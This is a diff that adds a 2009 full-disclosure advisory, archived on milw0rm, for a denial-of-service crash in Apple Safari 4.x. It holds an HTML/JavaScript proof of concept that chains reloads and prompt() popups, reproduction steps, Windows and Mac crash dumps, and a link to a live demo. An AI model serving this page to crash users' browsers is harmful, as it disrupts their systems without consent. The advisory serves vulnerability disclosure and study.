@@ -1,0 +1,84 @@
+___________________________________________________________________________________
+
+Apple Safari 4.x JavaScript Reload Denial of Service
+___________________________________________________________________________________
+
+Author   : Marcell 'SkyOut' Dietl, Achim Hoffmann
+Email    : mail [at] marcell-dietl [dot] de
+Vendor   : http://www.apple.com/
+Product  : http://www.apple.com/safari/
+Found    : 12.06.2009
+Released : 01.07.2009
+
+Tested on:
+ - Safari 4.0 at Windows XP SP3
+ - Safari 4.0.1 at Mac OS X 10.5.7
+___________________________________________________________________________________
+STEPS TO REPRODUCE
+
+1) Create a HTML file with the following content:
+
++----------
+| <html>
+| <body>
+| <script src="empty.js"></script>
+| <script>
+| try { crashSafari(); } catch(e) {
+| setTimeout("location.reload();",42);
+| prompt('apple culpa? comment:'); }
+| </script>
+| </body>
+| </html>
++----------
+
+2) Create an empty file called "empty.js" in the same directory.
+
+3) Put both files into the WWW directory of your server.
+
+4) Access the HTML file with your browser.
+   - A popup will appear: Close it.
+   - A popup will appear: Close it.
+   - Crash.
+
+5) On Windows:
+
++----------
+| AppName: safari.exe      AppVer: 4.530.17.0      ModName: webkit.dll
+| ModVer: 4.530.17.0       Offset: 00305f55
++----------
+
+5) On Mac OS X:
+
++----------
+| Process:         Safari [298]
+| Path:            /Applications/Safari.app/Contents/MacOS/Safari
+| Identifier:      com.apple.Safari
+| Version:         4.0.1 (5530.18)
+| Build Info:      WebBrowser-55301800~1
+| Code Type:       X86 (Native)
+| Parent Process:  launchd [163]
+|
+| Date/Time:       2009-07-01 00:58:48.144 +0200
+| OS Version:      Mac OS X 10.5.7 (9J61)
+| Report Version:  6
+|
+| Exception Type:  EXC_BAD_ACCESS (SIGBUS)
+| Exception Codes: KERN_PROTECTION_FAILURE at 0x0000000000000002
+|
+| Thread 0 crashed with X86 Thread State (32-bit):
+|   eax: 0x00000002  ebx: 0x900bac11  ecx: 0x00625eec  edx: 0x00000000
+|   edi: 0x00625ec8  esi: 0x00000002  ebp: 0xbfffe778  esp: 0xbfffe5e0
+|    ss: 0x0000001f  efl: 0x00010217  eip: 0x900bac74   cs: 0x00000017
+|    ds: 0x0000001f   es: 0x0000001f   fs: 0x00000000   gs: 0x00000037
+|   cr2: 0x00000002
++----------
+___________________________________________________________________________________
+Advisory  : http://marcell-dietl.de/index/adv_safari_4_x_js_reload_dos.php
+
+Live Demo : http://marcell-dietl.de/index/demo_safari_4_x_js_reload_dos.html
+
+Apple has been informed about the bug, but did not show any interest.
+___________________________________________________________________________________
+HAVING FUN WITH FULL DISCLOSURE SINCE 2006
+
+# milw0rm.com [2009-07-02]
